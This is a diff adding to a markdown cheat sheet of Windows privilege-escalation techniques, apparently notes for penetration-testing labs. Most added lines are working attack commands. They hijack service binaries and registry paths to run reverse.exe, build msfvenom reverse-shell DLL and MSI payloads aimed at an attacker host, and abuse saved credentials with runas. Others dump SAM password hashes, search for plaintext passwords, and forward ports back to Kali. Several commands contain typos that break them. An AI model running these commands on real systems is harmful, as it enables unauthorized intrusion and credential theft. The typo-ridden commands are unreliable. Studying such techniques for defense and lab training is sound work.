@@ -104,6 +104,28 @@ ms.exe <Kali-IP> 5555  # From target
 
 ### Service Exploits
 
+#### Basic Commands
+
+```powershell
+sc qc <name>  # Query the configuration of a service
+sc query <name>  # Query the current status of a service
+sc config <name> <option>= <value>  # Modify a configuration option of a service
+net start/stop <name>  # Start/Stop a service
+```
+
+#### Insecure Service Permissions
+
+```powershell
+# If we have permission to change configuraiton of a service which runs with SYSTEM
+# We can change the executable the service uses to one of our own
+# CATCH: We must be able to stop/start the service
+.\accesscheck.exe /accpeteula -uwcqv user daclsvc
+sc qc daclsvc
+sc query daclsvc
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+net start daclsvc
+```
+
 #### Binary Paths
 
 ```powershell
@@ -134,8 +156,15 @@ powshell -ep bypass
 . .\PowerUp.ps1
 Invoke-AllChecks
 # Look for ServiceName where Path does not contain any quotes (and can restart)
-sc qc unquotedsvc
+# Then look for which directory BUILTIN\Users can RW
+.\accesscheck.exe /accpeteula -uwcqv C:\
+.\accesscheck.exe /accpeteula -uwcqv "C:\Program Files\"
+.\accesscheck.exe /accpeteula -uwcqv "C:\Program Files\Unquoted Path Service\"
+.\accesscheck.exe /accpeteula -uwcqv user daclsvc
+copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+net start unquotedsvc
 
+sc qc unquotedsvc
 # Exploitation
 msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
 # Copy the generated file, common.exe, to the Windows VM.
@@ -144,15 +173,59 @@ msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-se
 sc start unquotedsvc
 ```
 
+#### Weak Registry Permissions
+
+```powershell
+powshell -exec bypass
+Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentConrtrolSet\Services\regsvc
+.\accesschk.exe /accepteula -ucqv user regsvc
+reg query HKLM\System\CurrentConrtrolSet\Services\regsvc
+reg add HKLM\System\CurrentConrtrolSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+net start regsvc
+```
+
+#### Insecure Service Executables
+
+```powershell
+.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+.\accesschk.exe /accepteula -uvqc filepermsvc
+copy "C:\Program Files\File Permissions Service\filepermservice.exe" C\"Temp
+copy -Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+net start filepermsvc
+```
+
+#### DLL Hijacking
+
+```powershell
+# Detection
+.\accesschk.exe /accepteula -uvqc dllsvc
+sc qc dllsvc
+# ProcMon requires admin permissions
+# Checks which dll's are missing and the directory we may be able to write to
+
+# Exploitation
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll
+copy \\<IP>\tools\hijackme.dll C:\Temp
+net stop dllsvc
+net start dllsvc
+```
+
 ### Registry Exploits
 
 #### Autoruns
 
 ```powershell
 # Detection
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
+RESTART WINDOWS
+
 # Open command prompt and type:
 C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
-#In Autoruns, click on the ‘Logon’ tab.
+# In Autoruns, click on the ‘Logon’ tab.
 # From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
 # In command prompt type: 
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
@@ -182,6 +255,9 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 # From the output, notice that "AlwaysInstallElevated" value is 1
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 # From the output, notice that “AlwaysInstallElevated” value is 1.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o /tools/reverse.msi
+copy \\<IP>\tools\reverse.msi .
+msiexec /quiet /qn /i reverse.msi
 
 # Exploitation
 ## From Kali
@@ -230,8 +306,43 @@ findstr /si password *.txt (*.xml, *.ini)
 netstat -ano  
 # Searching registry
 reg query HKLM /f password /t REG_SZ /s  # Look for plaintext passwords in output
+reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # find username and default passowrd
 # Could be password reuse to test on Administrator or other account
+
+# Exploit - from Kali
+winexe -U '<user>:<password>' //<target-IP> cmd.exe
+winexe -U '<user>:<password>' --system //<target-IP> cmd.exe
+```
+
+#### Saved Creds / RunAs
+
+```powershell
+# Stored credentials
+cmdkey /list
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+cmdkey /list  # Look for Current stored credentials
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt
+```
+
+#### Configuration Files
+
+```powershell
+# Recursivley search for files in the current directory
+dir /s *pass* == *.config
+findstr /si password *.xml *.ini *.txt
+# winexe can then be used to log into the system
+```
+
+#### SAM
+
+```powershell
+# The SAM and SYSTEM files are located in the C:\System32\config directory
+# The files are locked while Windows is running
+# Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories
+# samdump & pwdump both can dump the hashes from the SAM
+python2 pwdump.py /tools/SYSTEM /tools/SAM
 ```
 
 #### Port Forward
@@ -252,14 +363,28 @@ winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
 
 ### Scheduled Tasks
 
+```powershell
+schtasks /query /fo LIST /v
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} ft TaskName,TaskPath,State
+# View contents of any interesting scripts
+# Check to see if the file can be written to
+accesschk.exe /accepteula -quv user <script-name>
+echo C:\PrivEsc\reverse.exe >> <script-name>
+# Wait for scheduled task to run
+```
+
 ### Insecure GUI Apps
+
+```powershell
+```
 
 ### Startup Apps
 
 ```powershell
 # Detection
+.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
+# From the output notice that the “BUILTIN\Users” group has full or write access
 
 # Exploitation
 Metasploit, use multi/handler, set payload windows/meterpreter/reverse_tcp, run
@@ -271,7 +396,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o x.exe
 
 ### Installed Apps
 
-```
+```powershell
+# Searching Exploit-DB filtering on local, Windows, and priv esc
+tasklist /V
+.\seatbelt.exe  NonstandardProcesses
 ```
 
 ### Token Impersonation
@@ -281,6 +409,7 @@ whoami /priv
 meterpreter > getprivs
 # Look for SeImpersonatePrivilege as Enabled
 # Can use windows-exploit-suggester to find potato attacks
+# SeAssignPrimaryToken
 ```
 
 ### Potato Attacks
@@ -309,6 +438,11 @@ more < hm.txt:root.txt:$DATA
 ### Port Forwarding
 
 ```powershell
+# From Kali - Make sure PermitRootLogin is set to yes in /etc/ssh/sshd_config
+service ssh restart
+# From target
+.\plink.exe kali@<kali-IP> -R <kali-port>:127.0.0.1:<port-to-forward-to>
+.\plink.exe kali@<kali-IP> -R 445:127.0.0.1:445
 ```
 
 ### WSL
@@ -334,23 +468,6 @@ wmiexec.py
 ```bash
 meterpreter > getsystem
 meterpreter > getsystem -h
-```
-
-### RunAs
-
-```powershell
-cmdkey /list  # Look for Current stored credentials
-C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
-
-```
-
-### DLL Hijacking
-
-```powershell
-# Detection
-
-# Exploitaion
-
 ```
 
 ### Executable Files
